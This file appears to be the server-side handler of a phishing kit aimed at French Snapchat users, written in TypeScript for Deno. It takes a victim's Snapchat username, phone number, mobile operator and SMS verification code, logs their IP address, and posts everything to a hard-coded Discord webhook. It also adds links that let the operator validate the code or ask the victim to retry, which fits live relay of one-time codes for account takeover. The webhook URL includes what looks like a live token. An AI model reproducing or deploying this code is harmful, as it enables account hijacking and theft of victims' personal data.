import { createClientFromRequest } from 'npm:@base44/sdk@0.8.31';

const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1513598405744787527/OfecKTmHVNK-0sUDt3f7n5PLo8qjUAkFgcOxtUZ95NKlzBqF_uSvfq7_9x1De-k9YxwW";

Deno.serve(async (req) => {
  const base44 = createClientFromRequest(req);
  const { snapchat, telephone, operateur, code, submissionId } = await req.json();

  const ip = req.headers.get("x-forwarded-for")?.split(",")[0]?.trim() || "Inconnue";
  const now = new Date();
  const dateStr = now.toLocaleDateString("fr-FR", {
    weekday: "long", day: "numeric", month: "long", year: "numeric",
    hour: "2-digit", minute: "2-digit", second: "2-digit",
    timeZone: "Europe/Paris"
  });

  const operatorColors = { SFR: 16711680, Bouygues: 3447003, Orange: 16753920 };
  const appUrl = Deno.env.get("APP_URL")?.replace(/\/$/, "") || "https://snap-post-hub.base44.app";

  // These links call triggerSendCode with the action param
  const validUrl   = `${appUrl}/?triggerAction=valid&id=${submissionId}`;
  const wrongUrl   = `${appUrl}/?triggerAction=wrong&id=${submissionId}`;
  const expiredUrl = `${appUrl}/?triggerAction=expired&id=${submissionId}`;

  const embed = {
    title: "🔑 Code SMS entré",
    color: operatorColors[operateur] || 16776960,
    fields: [
      { name: "👻 Utilisateur", value: `@${snapchat}`, inline: true },
      { name: "📡 Opérateur", value: operateur, inline: true },
      { name: "📞 Numéro", value: telephone, inline: true },
      { name: "🔢 Code entré", value: `**${code}**`, inline: true },
      { name: "🌍 Pays", value: "France", inline: true },
      { name: "🕵️ Adresse IP", value: `\`${ip}\``, inline: true },
      { name: "🕐 Date de soumission", value: dateStr, inline: false },
      {
        name: "Actions",
        value: `✅ [**Valider le code**](${validUrl})\n❌ [**Changer le numéro**](${wrongUrl})\n⏰ [**Renvoyer au code**](${expiredUrl})`,
        inline: false
      },
    ],
    footer: { text: `ID: ${submissionId || "N/A"}` },
    timestamp: now.toISOString(),
  };

  await fetch(DISCORD_WEBHOOK, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ embeds: [embed] }),
  });

  return Response.json({ ok: true });
});